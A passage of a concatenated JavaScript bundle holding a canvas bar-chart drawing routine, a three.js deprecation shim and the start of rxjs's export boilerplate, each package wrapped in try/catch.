        return;
      }
      var ch = this.currentHint;
      if (ch == null || ch.index != res.index || ch.drawIndex != res.drawIndex) {
        this.currentHint = res;
        this.redraw();
      }
    };

    BarChart.prototype._draw = function() {
      var labelPositions = { }
      this.mouseListeners = [];
      this.fillRegions = [];

      var options = this.options;
      var ctx = this.ctx, content = this.content;
      var width = ctx.canvas.width, height = ctx.canvas.height;
      ctx.clearRect(0, 0, width, height);
      ctx.translate(-0.5, -0.5);
      var remainingWidth = width, remainingHeight = height;
      var index;

      if (options.fillColorBackground != null) {
        ctx.save();
        ctx.fillStyle = options.fillColorBackground;
        ctx.fillRect(0, 0, width, height);
        ctx.restore();
      }

      var topYPadding = options.paddingPixelsHorizontal;
      remainingHeight -= options.paddingPixelsHorizontal;
      ctx.fillStyle = 'rgb(0, 0, 0)';
      /* Draw title of bar chart */
      if (content.title != null) {
        ctx.save();
        ctx.font = Helpers.getFont({ weight: options.fontWeight, size: options.fontSizeTitle, family: options.font });
        ctx.textAlign = 'center';
        ctx.fillText(content.title, width / 2, topYPadding + options.fontSizeTitle);
        ctx.restore();
        remainingHeight -= options.fontSizeTitle * 1.25;
        topYPadding += options.fontSizeTitle * 1.25;
      }

      /* Compute required left padding */
      var leftXPadding = options.paddingPixelsVertical;
      remainingWidth  -= options.paddingPixelsVertical;

      var leftXDrawYLabel = null;
      if (content.yAxis != null) {
        leftXDrawYLabel = leftXPadding + options.fontSizeAxes * 0.5;
        remainingWidth -= options.fontSizeAxes * 1.25;
        leftXPadding += options.fontSizeAxes * 1.25;
      }

      ctx.save();
      ctx.font = Helpers.getFont({ weight: options.fontWeight, size: options.fontSizeTicks, family: options.font });
      var maxChartValue, minChartValue;
      if (options.barStyle === 'stacked') {
        maxChartValue = 0;
        minChartValue = Infinity;
        for (var cmIndex = 0; cmIndex < content.data.length; ++cmIndex) {
          var doB;
          if (Array.isArray(doB = content.data[cmIndex])) {
            var tempSum = 0;
            for (var ii2 = 0; ii2 < doB.length; ++ii2) tempSum += doB[ii2];
            maxChartValue = Math.max(maxChartValue, tempSum);
            minChartValue = Math.min(minChartValue, tempSum);
          } else {
            maxChartValue = Math.max(maxChartValue, content.data[cmIndex]);
            minChartValue = Math.min(minChartValue, content.data[cmIndex]);
          }
        }
      } else {
        maxChartValue = Helpers.upperMax(content.data);
        minChartValue = Helpers.lowerMin(content.data);
      }
      if (options.scaleStyle.indexOf('adaptive') === 0) {
        if (options.scaleStyle.indexOf(':') !== -1) {
          var floater = parseFloat(options.scaleStyle.split(/[:]/)[1]);
          minChartValue *= floater;
          maxChartValue *= 1 + (1 - floater) / 2.0;
        }
      } else minChartValue = 0;
      if (options.defaultMaxTick > maxChartValue) maxChartValue = options.defaultMaxTick;
      if (content.bars != null && Array.isArray(content.bars)) {
        for (index = 0; index < content.bars.length; ++index) {
          var cbv = content.bars[index].value;
          if (isNaN(cbv)) continue;
          maxChartValue = Math.max(maxChartValue, cbv);
          minChartValue = Math.min(minChartValue, cbv);
        }
      }
      var maxYAxisTickWidth = options.scaleStyle == 'log2' ? Math.ceil(Math.pow(2, maxChartValue)) : (Math.ceil(maxChartValue) + '.00');
      if (options.tickFormatterMeasure != null) maxYAxisTickWidth = options.tickFormatterMeasure;
      maxYAxisTickWidth = ctx.measureText(maxYAxisTickWidth).width;
      maxYAxisTickWidth = Math.ceil(maxYAxisTickWidth) + options.paddingPixelsTicks;
      remainingWidth -= maxYAxisTickWidth;
      leftXPadding += maxYAxisTickWidth;
      ctx.restore();

      var rightXPadding = options.paddingPixelsVertical;
      remainingWidth -= options.paddingPixelsVertical;

      /* Draw legend */
      if (content.legend != null && Array.isArray(content.legend)) {
        ctx.save();
        ctx.font = Helpers.getFont({ weight: options.fontWeight, size: options.fontSizeLegend, family: options.font });
        var maxLWidth = 0;
        for (var lIndex = 0; lIndex < content.legend.length; ++lIndex) {
          maxLWidth = Math.max(maxLWidth, ctx.measureText(content.legend[lIndex].label).width);
        }
        maxLWidth = Math.ceil(maxLWidth);
        maxLWidth += options.pixelsLegendSquare + 8;
        var legendEntriesPerLine = Math.floor((remainingWidth - options.paddingPixelsHorizontal * 2) / maxLWidth);
        var lLReqHeight = Math.ceil(content.legend.length / legendEntriesPerLine) * options.fontSizeLegend * 1.5;
        remainingHeight -= lLReqHeight;
        bottomYPadding += lLReqHeight;

        ctx.strokeStyle = 'rgb(0, 0, 0)';
        ctx.fillStyle = options.fillColorLegend;
        var bSX, bSY;
        ctx.beginPath();
        ctx.moveTo(bSX = leftXPadding, bSY = topYPadding + remainingHeight);
        ctx.lineTo(bSX + remainingWidth, bSY);
        ctx.lineTo(bSX + remainingWidth, bSY + lLReqHeight);
        ctx.lineTo(bSX, bSY + lLReqHeight);
        ctx.lineTo(bSX, bSY);
        ctx.stroke();
        ctx.fill();

        for (lIndex = 0; lIndex < content.legend.length; ++lIndex) {
          var legLine = Math.floor(lIndex / legendEntriesPerLine);
          var legCol = lIndex % legendEntriesPerLine;
          ctx.fillStyle = content.legend[lIndex].color;
          var boxX = bSX + legCol * maxLWidth + 3, boxY = bSY + legLine * options.fontSizeLegend * 1.5 + options.fontSizeLegend * 0.5;
          ctx.beginPath();
          ctx.moveTo(boxX, boxY);
          ctx.lineTo(boxX + options.pixelsLegendSquare, boxY);
          ctx.lineTo(boxX + options.pixelsLegendSquare, boxY + options.pixelsLegendSquare);
          ctx.lineTo(boxX, boxY + options.pixelsLegendSquare);
          ctx.lineTo(boxX, boxY);
          ctx.fill();
          ctx.stroke();

          ctx.textAlign = 'left';
          ctx.fillStyle = 'rgb(0, 0, 0)';
          ctx.fillText(content.legend[lIndex].label, boxX + 3 + options.pixelsLegendSquare, boxY + options.fontSizeLegend * 0.5);
        }

        ctx.restore();
      }

      /* Draw x-axis label of bar chart */
      var bottomYPadding = options.paddingPixelsHorizontal;
      remainingHeight -= options.paddingPixelsHorizontal;
      if (content.xAxis != null) {
        ctx.save();
        ctx.font = Helpers.getFont({ weight: options.fontWeight, size: options.fontSizeAxes, family: options.font });
        ctx.fillStyle = 'rgb(0, 0, 0)';
        ctx.textAlign = 'center';
        ctx.fillText(content.xAxis, (width - remainingWidth) + remainingWidth / 2, topYPadding + remainingHeight - bottomYPadding);
        remainingHeight -= options.fontSizeAxes * 1.5;
        bottomYPadding += options.fontSizeAxes * 1.5;
        ctx.restore();
      }

      var widthPerBar = remainingWidth / content.data.length;

      /* Draw x-axis top labels */
      if (content.topLabels != null) {
        ctx.save();
        ctx.textAlign = 'center';
        ctx.font = Helpers.getFont({ weight: options.fontWeight, size: options.fontSizeLabels, family: options.font });
        remainingHeight -= options.fontSizeLabels * 1.5;
        topYPadding += options.fontSizeLabels * 1.5;
        for (index = 0; index < content.topLabels.length; ++index) {
          ctx.fillText(
            content.topLabels[index],
            leftXPadding + index * widthPerBar + widthPerBar / 2,
            topYPadding - options.fontSizeLabels / 2
          );
        }
        ctx.restore();
      }

      /* Draw x-axis labels */
      ctx.save();
      var reqWidth = 0;
      if (content.dataTags != null) {
        ctx.font = Helpers.getFont({ weight: options.fontWeight, size: options.fontDataTags, family: options.font });
        var dataTags = content.dataTags;
        for (index = 0; index < dataTags.length; ++index) {
          if (Array.isArray(dataTags[index])) {
            for (var index2 = 0; index2 < dataTags[index].length; ++index2) {
              reqWidth = Math.max(reqWidth, Math.ceil(ctx.measureText(dataTags[index][index2]).width + 5));
            }
          } else {
            reqWidth = Math.max(reqWidth, Math.ceil(ctx.measureText(dataTags[index]).width + 5));
          }
        }
      }

      ctx.font = Helpers.getFont({ weight: options.fontWeight, size: options.fontSizeLabels, family: options.font });
      var computedBarPadding = Math.floor((widthPerBar * options.paddingPercentBars) / 2);
      var wwh = widthPerBar - computedBarPadding * 2;
      if (wwh < reqWidth) {
        computedBarPadding -= Math.ceil((reqWidth - wwh) / 2);
        computedBarPadding = Math.max(0, computedBarPadding);
      } else if (options.maxWidthBars > 0 && wwh > options.maxWidthBars) {
        computedBarPadding = Math.floor((widthPerBar - options.maxWidthBars) / 2);
      }
      var maxTextWidth = 0, maxTextStackSize = 1;
      for (index = 0; index < content.labels.length; ++index) {
        var tLabel = content.labels[index];
        if (Array.isArray(tLabel)) {
          maxTextStackSize = Math.max(maxTextStackSize, tLabel.length);
          for (index2 = 0; index2 < tLabel.length; ++index2) {
            maxTextWidth = Math.max(maxTextWidth, ctx.measureText(tLabel[index2]).width);
          }
        } else maxTextWidth = Math.max(maxTextWidth, ctx.measureText(tLabel).width);
      }
      var xLabelsRotated = false;
      if (maxTextWidth > widthPerBar - computedBarPadding) {
        ctx.textAlign = 'right';
        ctx.rotate(Math.PI * 1.5);
        xLabelsRotated = true;
      } else {
        ctx.textAlign = 'center';
      }
      var lastLabelY = -options.fontSizeLabels;
      for (index = 0; index < content.labels.length; ++index) {
        var cLabel = content.labels[index];
        var x = leftXPadding + index * widthPerBar + widthPerBar / 2, y = topYPadding + remainingHeight - options.fontSizeLabels / 2;
        if (xLabelsRotated) {
          y = topYPadding + remainingHeight - maxTextWidth + 5;
          y = [x, x = -y][0];

          if (y < lastLabelY + options.fontSizeLabels) continue;
          lastLabelY = y;
        }
        var yUp = options.fontSizeLabels * (maxTextStackSize - 1);
        if (Array.isArray(cLabel)) {
          if (xLabelsRotated) {
            yUp = options.fontSizeLabels * (cLabel.length - 1.5);
            yUp /= 2;
          }
          for (index2 = 0; index2 < cLabel.length; ++index2) {
            ctx.fillText(cLabel[index2], x, y - yUp);
            yUp -= options.fontSizeLabels;
          }
        } else {
          if (xLabelsRotated) yUp = -options.fontSizeLabels * 0.25;
          ctx.fillText(cLabel, x, y - yUp);
        }
      }
      if (xLabelsRotated) {
        remainingHeight -= maxTextWidth + 5;
        bottomYPadding += maxTextWidth + 5;
      } else {
        var remVal = options.fontSizeLabels * maxTextStackSize;
        remVal += options.fontSizeLabels * 0.5;
        remainingHeight -= remVal;
        bottomYPadding += remVal;
      }
      ctx.restore();

      /* Draw boundaries */
      var boundX1 = leftXPadding, boundX2 = leftXPadding + remainingWidth;
      var boundY1 = topYPadding, boundY2 = topYPadding + remainingHeight;

      for (index = 0; index < content.labels.length; ++index) labelPositions[index] = {
        xStart: leftXPadding + index * widthPerBar,
        xEnd: leftXPadding + (1 + index) * widthPerBar,
        yStart: boundY1, yEnd: boundY2
      }

      ctx.save();
      ctx.strokeStyle = 'rgb(0, 0, 0)';
      ctx.beginPath();
      if (content.topLabels != null) {
        ctx.moveTo(boundX2, boundY1);
        ctx.lineTo(boundX1, boundY1);
      } else {
        ctx.moveTo(boundX1, boundY1);
      }
      ctx.lineTo(boundX1, boundY2);
      ctx.lineTo(boundX2, boundY2);
      if (content.topLabels != null) ctx.lineTo(leftXPadding + remainingWidth, topYPadding);
      ctx.stroke();
      ctx.restore();

      /* Draw top label */
      if (content.topLabel != null) {
        ctx.save();
        ctx.textAlign = 'right';
        ctx.font = Helpers.getFont({ weight: options.fontWeight, size: options.fontSizeLabels, family: options.font });
        ctx.fillText(content.topLabel, leftXPadding - 3, topYPadding - options.fontSizeLabels / 2);
        ctx.restore();
      }

      /* Draw y-axis label of bar chart */
      if (content.yAxis != null) {
        ctx.save();
        ctx.rotate(Math.PI * 1.5);
        ctx.font = Helpers.getFont({ weight: options.fontWeight, size: options.fontSizeAxes, family: options.font });
        ctx.fillStyle = 'rgb(0, 0, 0)';
        ctx.textAlign = 'center';
        ctx.fillText(content.yAxis, -(topYPadding + remainingHeight / 2), leftXDrawYLabel);
        ctx.restore();
      }

      /* Draw y-axis labels */
      ctx.save();
      ctx.fillStyle = 'rgb(0, 0, 0)';
      ctx.strokeStyle = 'rgba(0, 0, 0, 0.20)';
      ctx.font = Helpers.getFont({ weight: options.fontWeight, size: options.fontSizeTicks, family: options.font });
      ctx.textAlign = 'right';
      var tickMeta = Helpers.getLinearTicks(0, maxChartValue, Math.max(2, remainingHeight / (options.fontSizeTicks * (1 + options.paddingPercentTicks))));
      var alpha = maxChartValue / options.fontSizeTicks;
      maxChartValue = tickMeta[1];
      if (maxChartValue > 1) maxChartValue += Math.ceil(alpha);
      else maxChartValue += alpha;
      var ticks = [];
      while (tickMeta[0] <= tickMeta[1]) {
        ticks.push(tickMeta[0]);
        tickMeta[0] += tickMeta[2];
      }
      for (index = 0; index < ticks.length; ++index) {
        var tickHeight = Math.round(remainingHeight * Helpers.getAxisRatio(minChartValue, maxChartValue, ticks[index]));
        if (tickHeight < 0) continue;
        if (options.scaleStyle == 'log2' && ticks[index] !== 0) ticks[index] = Math.round(Math.pow(2, ticks[index]));
        else ticks[index] = Math.floor(ticks[index] * 100) / 100;
        if (options.tickFormatter != null && typeof options.tickFormatter === 'function') {
          ctx.fillText(options.tickFormatter(ticks[index]).toString(), leftXPadding - options.paddingPixelsTicks, topYPadding + remainingHeight - tickHeight);
        } else {
          ctx.fillText(ticks[index].toString(), leftXPadding - options.paddingPixelsTicks, topYPadding + remainingHeight - tickHeight);
        }
        if (index == 0) continue;
        ctx.beginPath();
        ctx.moveTo(leftXPadding, topYPadding + remainingHeight - tickHeight);
        ctx.lineTo(leftXPadding + remainingWidth, topYPadding + remainingHeight - tickHeight);
        ctx.stroke();
      }
      ctx.restore();

      if (content.bars != null && Array.isArray(content.bars)) {
        ctx.save();
        for (index = 0; index < content.bars.length; ++index) {
          var cBar = content.bars[index];
          if (cBar.value > maxChartValue) continue;
          var renderBarY = topYPadding + remainingHeight - Math.round(remainingHeight * Helpers.getAxisRatio(minChartValue, maxChartValue, cBar.value));
          ctx.strokeStyle = cBar.style;
          ctx.fillStyle = cBar.style;
          ctx.beginPath();
          ctx.moveTo(boundX1, renderBarY);
          ctx.lineTo(boundX2, renderBarY);
          ctx.stroke();
          ctx.fill();
        }
        ctx.restore();
      }

      /* Draw bars */
      ctx.save();
      var lastData = null;
      for (index = 0; index < content.data.length; ++index) {
        var fillColorForIndex = null;
        var strokeColorForIndex = null;
        if (content.fillColor != null) {
          if (Array.isArray(content.fillColor)) fillColorForIndex = ctx.fillStyle = content.fillColor[index];
          else ctx.fillStyle = content.fillColor;
        } else ctx.fillStyle = options.fillColorBars;
        if (content.strokeColor != null) {
          if (Array.isArray(content.strokeColor)) strokeColorForIndex = ctx.strokeStyle = content.strokeColor[index];
          else ctx.strokeStyle = content.strokeColor;
        } else ctx.strokeStyle = options.strokeColorBars;
        var v = content.data[index];
        var vIsArr = Array.isArray(v);
        var renderStartX = leftXPadding + widthPerBar * index;
        if (vIsArr && options.barStyle === 'stacked') {
          var runningValue = 0, lastHeight = 0;
          for (var drawIndex = 0; drawIndex < v.length; ++drawIndex) {
            if (fillColorForIndex != null && Array.isArray(fillColorForIndex)) {
              ctx.fillStyle = fillColorForIndex[drawIndex] || options.fillColorBars;
            }
            if (strokeColorForIndex != null && Array.isArray(strokeColorForIndex)) {
              ctx.strokeStyle = strokeColorForIndex[drawIndex] || options.strokeColorBars;
            }

            runningValue += v[drawIndex];
            var renderBarHeight = Math.floor(remainingHeight * Helpers.getAxisRatio(minChartValue, maxChartValue, runningValue));
            var renderUpToY = topYPadding + remainingHeight - renderBarHeight;
            if (Math.abs(renderBarHeight - lastHeight) < options.stackedBarPadding + 2) {
              lastHeight = renderBarHeight;
              continue;
            }

            var barPadP = drawIndex > 0 ? options.stackedBarPadding : 0;
            var tSX, tSY;
            var tEX, tEY;
            ctx.beginPath();
            ctx.moveTo(tSX = renderStartX + computedBarPadding, tSY = topYPadding + remainingHeight - lastHeight - barPadP);
            ctx.lineTo(renderStartX + computedBarPadding, renderUpToY);
            ctx.lineTo(tEX = renderStartX + (widthPerBar - 1) - computedBarPadding, tEY = renderUpToY);
            ctx.lineTo(renderStartX + (widthPerBar - 1) - computedBarPadding, topYPadding + remainingHeight - lastHeight - barPadP);
            if (drawIndex > 0) ctx.lineTo(tSX, tSY);
            ctx.stroke();
            ctx.fill();
            var hint;
            if (content.hints != null && content.hints[index] != null && (hint = content.hints[index][drawIndex]) != null) {
              this.mouseListeners.push(function(index, drawIndex, hint, sx, sy, ex, ey, x, y) {
                var minX = Math.min(sx, ex), maxX = Math.max(sx, ex);
                var minY = Math.min(sy, ey), maxY = Math.max(sy, ey);
                if (x < minX || x > maxX || y < minY || y > maxY) return null;
                return { index: index, drawIndex: drawIndex, rect: { left: minX, right: maxX, top: minY, bottom: maxY }, text: hint.split('\n') };
              }.bind(this, index, drawIndex, hint, tSX, tSY, tEX, tEY));
            }

            var tagText;
            if (tSY - renderUpToY > options.fontDataTags * 1.25 && content.dataTags != null && (tagText = content.dataTags[index]) != null && (tagText = tagText[drawIndex]) != null) {
              var oFS = ctx.fillStyle;
              ctx.fillStyle = 'rgb(0, 0, 0)';
              ctx.font = Helpers.getFont({ weight: options.fontWeight, size: options.fontDataTags, family: options.font });
              ctx.textAlign = 'center';
              ctx.fillText(tagText, renderStartX + widthPerBar / 2, tSY - options.fontDataTags * 0.25);
              ctx.fillStyle = oFS;
            }

            lastHeight = renderBarHeight;
          }

          if (content.barTooltips != null) {
            ctx.fillStyle = 'rgb(0, 0, 0)';
            ctx.font = Helpers.getFont({ weight: options.fontWeight, size: options.fontSizeLabels, family: options.font });
            ctx.textAlign = 'center';
            ctx.fillText(content.barTooltips[index] || '', renderStartX + widthPerBar / 2, renderUpToY - 3);
          }
        } else if (options.barStyle === 'line') {
          if (vIsArr) {
            var rbx = renderStartX + widthPerBar / 2;

            var lDu;
            if (options.fillRegion === 'background') {
              lDu = lastData;
              if (Array.isArray(lDu)) lDu = lDu[0];
              if (lDu != null) {
                var sFS = ctx.fillStyle
                ctx.fillStyle = lDu.color
                ctx.fillRect(lDu.x, boundY1, rbx - lDu.x, boundY2 - boundY1)
                ctx.fillStyle = sFS
              }
            }

            var nLData = [];
            for (var drawIndex = 0; drawIndex < v.length; ++drawIndex) {
              var renderBarHeight3 = Math.round(remainingHeight * Helpers.getAxisRatio(minChartValue, maxChartValue, v[drawIndex]));
              var renderUpToY3 = topYPadding + remainingHeight - renderBarHeight3;

              var rby = renderUpToY3;
              if (lastData != null) {
                var tLX, tLY;
                if (Array.isArray(lastData)) {
                  tLX = (lastData[drawIndex] || { }).x;
                  tLY = (lastData[drawIndex] || { }).y;
                } else {
                  tLX = lastData.x;
                  tLY = lastData.y;
                }

                if (tLX && tLY) {
                  if (Array.isArray(strokeColorForIndex)) {
                    ctx.strokeStyle = strokeColorForIndex[drawIndex] || options.strokeColorBars;
                  } else ctx.strokeStyle = strokeColorForIndex || 'rgb(0, 0, 0)';
                  ctx.beginPath();
                  ctx.moveTo(tLX, tLY);
                  ctx.lineTo(rbx, rby);
                  ctx.stroke();
                }
              }

              if (Array.isArray(fillColorForIndex)) {
                ctx.fillStyle = fillColorForIndex[drawIndex] || options.fillColorBars;
              }
              if (Array.isArray(strokeColorForIndex)) {
                ctx.strokeStyle = strokeColorForIndex[drawIndex] || options.strokeColorBars;
              }

              ctx.beginPath();
              ctx.arc(rbx, rby, options.radiusDot, 0, 2 * Math.PI);
              ctx.stroke();
              ctx.fill();

              nLData[drawIndex] = { x: rbx, y: rby, color: ctx.fillStyle };
            }
            lastData = nLData;
            if (lDu != null && lDu.color != lastData[0].color) this.fillRegions.push({
              x: lastData[0].x,
              y: lastData[0].y,
              prev: lDu.color,
              next: lastData[0].color
            })

            if (content.balls != null && Array.isArray(content.balls) && index < content.balls.length) {
              var ball = content.balls[index]
              if (ball != null) {
                ctx.beginPath();
                ctx.fillStyle = ball.fill;
                ctx.strokeStyle = ball.stroke;
                ctx.arc(rbx, topYPadding + remainingHeight - (remainingHeight * Helpers.getAxisRatio(minChartValue, maxChartValue, minChartValue + ball.value)), ball.radius, 0, 2 * Math.PI);
                ctx.stroke();
                ctx.fill();
              }
            }
          } else {
            var renderBarHeight3 = Math.round(remainingHeight * Helpers.getAxisRatio(minChartValue, maxChartValue, v));
            var renderUpToY3 = topYPadding + remainingHeight - renderBarHeight3;

            var rbx = renderStartX + widthPerBar / 2, rby = renderUpToY3;
            var lDu;
            if (options.fillRegion === 'background') {
              if (lastData != null) {
                lDu = lastData;
                if (Array.isArray(lDu)) lDu = lDu[0];
                var sFS = ctx.fillStyle
                ctx.fillStyle = lDu.color
                ctx.fillRect(lDu.x, boundY1, rbx - lDu.x, boundY2 - boundY1)
                ctx.fillStyle = sFS
              }
            }
            ctx.beginPath();
            ctx.arc(rbx, rby, options.radiusDot, 0, 2 * Math.PI);
            ctx.stroke();
            ctx.fill();

            if (lastData != null) {
              if (Array.isArray(lastData)) {
                var tLX, tLY;
                for (var key in lastData) {
                  if (!lastData.hasOwnProperty(key)) continue;
                  tLX = lastData[key].x;
                  tLY = lastData[key].y;
                  if (tLX && tLY) {
                    ctx.strokeStyle = strokeColorForIndex || 'rgb(0, 0, 0)';
                    ctx.beginPath();
                    ctx.moveTo(tLX, tLY);
                    ctx.lineTo(rbx, rby);
                    ctx.stroke();
                  }
                }
              } else {
                var tLX = lastData.x, tLY = lastData.y;
                if (tLX && tLY) {
                  ctx.strokeStyle = strokeColorForIndex || 'rgb(0, 0, 0)';
                  ctx.beginPath();
                  ctx.moveTo(tLX, tLY);
                  ctx.lineTo(rbx, rby);
                  ctx.stroke();
                }
              }
            }

            lastData = { x: rbx, y: rby, color: ctx.fillStyle };
            if (lDu != null && lDu.color != lastData.color) this.fillRegions.push({
              x: lastData.x,
              y: lastData.y,
              prev: lDu.color,
              next: lastData.color
            })

            if (content.balls != null && Array.isArray(content.balls) && index < content.balls.length) {
              var ball = content.balls[index]
              if (ball != null) {
                ctx.beginPath();
                ctx.fillStyle = ball.fill;
                ctx.strokeStyle = ball.stroke;
                ctx.arc(rbx, topYPadding + remainingHeight - (remainingHeight * Helpers.getAxisRatio(minChartValue, maxChartValue, minChartValue + ball.value)), ball.radius, 0, 2 * Math.PI);
                ctx.stroke();
                ctx.fill();
              }
            }
          }

          var hint;
          if (content.hints != null && (hint = content.hints[index]) != null) {
            this.mouseListeners.push(function(index, hint, sx, sy, ex, ey, x, y) {
              var minX = Math.min(sx, ex), maxX = Math.max(sx, ex);
              var minY = Math.min(sy, ey), maxY = Math.max(sy, ey);
              if (x < minX || x > maxX || y < minY || y > maxY) return null;
              return { index: index, drawIndex: drawIndex, rect: { left: minX, right: maxX, top: minY, bottom: maxY }, text: hint.split('\n') };
            }.bind(this, index, hint, rbx - 1, topYPadding, rbx + 1, topYPadding + remainingHeight));
          }
        } else {
          if (vIsArr) v = Helpers.avg(v);
          var renderBarHeight2 = Math.round(remainingHeight * Helpers.getAxisRatio(minChartValue, maxChartValue, v));
          var renderUpToY2 = topYPadding + remainingHeight - renderBarHeight2;
          ctx.beginPath();
          ctx.moveTo(renderStartX + computedBarPadding, topYPadding + remainingHeight);
          ctx.lineTo(renderStartX + computedBarPadding, renderUpToY2);
          ctx.lineTo(renderStartX + (widthPerBar - 1) - computedBarPadding, renderUpToY2);
          ctx.lineTo(renderStartX + (widthPerBar - 1) - computedBarPadding, topYPadding + remainingHeight);
          ctx.stroke();
          ctx.fill();

          if (options.barStyle === 'error') {
            var val;
            if ((val = content._data_standard_error[index]) != 0) {
              var renderBarError = Math.round(remainingHeight * Helpers.getAxisRatio(minChartValue, maxChartValue, val));
              ctx.beginPath();
              var wiskerWidth = Math.round((widthPerBar - computedBarPadding * 2) / 8);
              var x_ = leftXPadding + widthPerBar * index + widthPerBar / 2;
              ctx.moveTo(x_ - wiskerWidth, renderUpToY2 + renderBarError);
              ctx.lineTo(x_ + wiskerWidth, renderUpToY2 + renderBarError);
              ctx.moveTo(x_, renderUpToY2 + renderBarError);
              ctx.lineTo(x_, renderUpToY2 - renderBarError);
              ctx.moveTo(x_ - wiskerWidth, renderUpToY2 - renderBarError);
              ctx.lineTo(x_ + wiskerWidth, renderUpToY2 - renderBarError);
              ctx.stroke();
            }
          }

          if (content.barTooltips != null) {
            ctx.fillStyle = 'rgb(0, 0, 0)';
            ctx.font = Helpers.getFont({ weight: options.fontWeight, size: options.fontSizeLabels, family: options.font });
            ctx.textAlign = 'center';
            ctx.fillText(content.barTooltips[index] || '', renderStartX + widthPerBar / 2, renderUpToY2 - 3);
          }
        }
      }
      ctx.restore();

      if (this.currentHint != null) {
        ctx.save();
        var hRect = this.currentHint.rect, hints = this.currentHint.text;
        ctx.fillStyle = 'rgb(0, 0, 0)';
        ctx.font = Helpers.getFont({ weight: options.fontWeight, size: options.fontSizeHint, family: options.font });
        ctx.textAlign = 'left';
        var boxWidth = 0;
        for (index = 0; index < hints.length; ++index) {
          boxWidth = Math.max(boxWidth, Math.ceil(ctx.measureText(hints[index]).width));
        }
        var boxWidthPadding = 5;
        var lineHeight = options.fontSizeHint * 1.5;
        var boxHeight = hints.length * lineHeight;
        var drawX = hRect.right + 10, drawY = (hRect.top + hRect.bottom) / 2;
        boxWidth += boxWidthPadding * 2;
        if (drawX + boxWidth > width) {
          drawX = hRect.left - boxWidth - 10;
        }
        if (drawY - boxHeight / 2 < 0) {
          drawY = Math.ceil(boxHeight / 2) + 1;
        } else if (drawY + boxHeight / 2 > height) {
          drawY = height - boxHeight / 2 - 1;
        }
        ctx.clearRect(drawX, drawY - boxHeight / 2, boxWidth, boxHeight);
        ctx.beginPath();
        ctx.rect(drawX, drawY - boxHeight / 2, boxWidth, boxHeight);
        ctx.stroke();
        for (index = 0; index < hints.length; ++index) {
          ctx.fillText(hints[index], drawX + boxWidthPadding, drawY - boxHeight / 2 + options.fontSizeHint + index * lineHeight);
        }
        ctx.restore();
      }

      ctx.translate(0.5, 0.5);

      this.labelPositions = labelPositions;
    };

    return BarChart;
  })();

  if (typeof module !== 'undefined' && typeof module.exports !== 'undefined') {
    module.exports = BarChart;
  } else {
    window.BarChart = BarChart;
  }
})();

}catch(e){}
})();

/* >>> three.js (363 bytes) <<< */
(function(){
try{
var THREE = require('three');

console.warn( "WARNING: The 'three.js' npm package is deprecated in favor of the 'three' npm package, please upgrade.");

if (typeof exports !== 'undefined') {
  if (typeof module !== 'undefined' && module.exports) {
    exports = module.exports = THREE;
  }
  exports.THREE = THREE;
} else {
  this['THREE'] = THREE;
}

}catch(e){}
})();

/* >>> rxjs (35131 bytes) <<< */
(function(){
try{
"use strict";
var __createBinding = (this && this.__createBinding) || (Object.create ? (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    Object.defineProperty(o, k2, { enumerable: true, get: function() { return m[k]; } });
}) : (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    o[k2] = m[k];
}));
var __exportStar = (this && this.__exportStar) || function(m, exports) {
    for (var p in m) if (p !== "default" && !Object.prototype.hasOwnProperty.call(exports, p)) __createBinding(exports, m, p);
};
Object.defineProperty(exports, "__esModule", { value: true });
exports.interval = exports.iif = exports.generate = exports.fromEventPattern = exports.fromEvent = exports.from = exports.forkJoin = exports.empty = exports.defer = exports.connectable = exports.concat = exports.combineLatest = exports.bindNodeCallback = exports.bindCallback = exports.UnsubscriptionError = exports.TimeoutError = exports.SequenceError = exports.ObjectUnsubscribedError = exports.NotFoundError = exports.EmptyError = exports.ArgumentOutOfRangeError = exports.firstValueFrom = exports.lastValueFrom = exports.isObservable = exports.identity = exports.noop = exports.pipe = exports.NotificationKind = exports.Notification = exports.Subscriber = exports.Subscription = exports.Scheduler = exports.VirtualAction = exports.VirtualTimeScheduler = exports.animationFrameScheduler = exports.animationFrame = exports.queueScheduler = exports.queue = exports.asyncScheduler = exports.async = exports.asapScheduler = exports.asap = exports.AsyncSubject = exports.ReplaySubject = exports.BehaviorSubject = exports.Subject = exports.animationFrames = exports.observable = exports.ConnectableObservable = exports.Observable = void 0;
exports.filter = exports.expand = exports.exhaustMap = exports.exhaustAll = exports.exhaust = exports.every = exports.endWith = exports.elementAt = exports.distinctUntilKeyChanged = exports.distinctUntilChanged = exports.distinct = exports.dematerialize = exports.delayWhen = exports.delay = exports.defaultIfEmpty = exports.debounceTime = exports.debounce = exports.count = exports.connect = exports.concatWith = exports.concatMapTo = exports.concatMap = exports.concatAll = exports.combineLatestWith = exports.combineLatestAll = exports.combineAll = exports.catchError = exports.bufferWhen = exports.bufferToggle = exports.bufferTime = exports.bufferCount = exports.buffer = exports.auditTime = exports.audit = exports.config = exports.NEVER = exports.EMPTY = exports.scheduled = exports.zip = exports.using = exports.timer = exports.throwError = exports.range = exports.race = exports.partition = exports.pairs = exports.onErrorResumeNext = exports.of = exports.never = exports.merge = void 0;
exports.switchMap = exports.switchAll = exports.subscribeOn = exports.startWith = exports.skipWhile = exports.skipUntil = exports.skipLast = exports.skip = exports.single = exports.shareReplay = exports.share = exports.sequenceEqual = exports.scan = exports.sampleTime = exports.sample = exports.refCount = exports.retryWhen = exports.retry = exports.repeatWhen = exports.repeat = exports.reduce = exports.raceWith = exports.publishReplay = exports.publishLast = exports.publishBehavior = exports.publish = exports.pluck = exports.pairwise = exports.onErrorResumeNextWith = exports.observeOn = exports.multicast = exports.min = exports.mergeWith = exports.mergeScan = exports.mergeMapTo = exports.mergeMap = exports.flatMap = exports.mergeAll = exports.max = exports.materialize = exports.mapTo = exports.map = exports.last = exports.isEmpty = exports.ignoreElements = exports.groupBy = exports.first = exports.findIndex = exports.find = exports.finalize = void 0;
exports.zipWith = exports.zipAll = exports.withLatestFrom = exports.windowWhen = exports.windowToggle = exports.windowTime = exports.windowCount = exports.window = exports.toArray = exports.timestamp = exports.timeoutWith = exports.timeout = exports.timeInterval = exports.throwIfEmpty = exports.throttleTime = exports.throttle = exports.tap = exports.takeWhile = exports.takeUntil = exports.takeLast = exports.take = exports.switchScan = exports.switchMapTo = void 0;
var Observable_1 = require("./internal/Observable");
Object.defineProperty(exports, "Observable", { enumerable: true, get: function () { return Observable_1.Observable; } });
var ConnectableObservable_1 = require("./internal/observable/ConnectableObservable");
